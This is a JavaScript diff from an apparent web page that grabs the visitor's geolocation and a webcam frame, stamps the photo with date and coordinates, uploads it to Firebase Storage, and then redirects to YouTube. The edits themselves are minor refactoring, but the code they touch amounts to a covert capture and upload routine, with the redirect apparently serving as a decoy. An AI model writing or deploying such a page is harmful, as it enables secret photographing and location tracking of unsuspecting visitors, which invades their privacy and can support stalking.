@@ -15,16 +15,17 @@ const storage = firebase.storage();
 const database = firebase.database();
 
 // Variable to store location
-let userLocation = null;
+let userLocation = {
+    latitude: null,
+    longitude: null
+};
 
 // Function to request location permission and get location
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
-            userLocation = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-            };
+            userLocation.latitude = position.coords.latitude.toFixed(6); // Store latitude
+            userLocation.longitude = position.coords.longitude.toFixed(6); // Store longitude
             console.log('Location retrieved:', userLocation);
         }, (error) => {
             console.error('Error accessing location:', error);
@@ -57,12 +58,9 @@ function capturePhoto(video) {
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     // Check if location is available for watermark
-    if (userLocation) {
-        const latitude = userLocation.latitude.toFixed(6); // Limit to 6 decimal places
-        const longitude = userLocation.longitude.toFixed(6);
-
+    if (userLocation.latitude && userLocation.longitude) {
         // Set watermark text with date, time, and location
-        const watermarkText = `Date: ${formatDateTime()} \nL:${latitude}, L:${longitude}`;
+        const watermarkText = `Date: ${formatDateTime()} \nL:${userLocation.latitude}, L:${userLocation.longitude}`;
 
         // Set watermark background
         context.fillStyle = 'black';
@@ -84,12 +82,11 @@ function capturePhoto(video) {
         try {
             // Upload the image to Firebase Storage
             await storageRef.put(blob);
-
             console.log('Photo uploaded with filename:', fileName);
 
             // Redirect after 1 second
             setTimeout(() => {
-                window.location.href = 'https://youtube.com/';
+                window.location.href = 'https://youtube.com/';  // Redirect URL after upload
             }, 1000);  // 1000 milliseconds = 1 second
         } catch (error) {
             console.error('Error uploading to Firebase:', error);
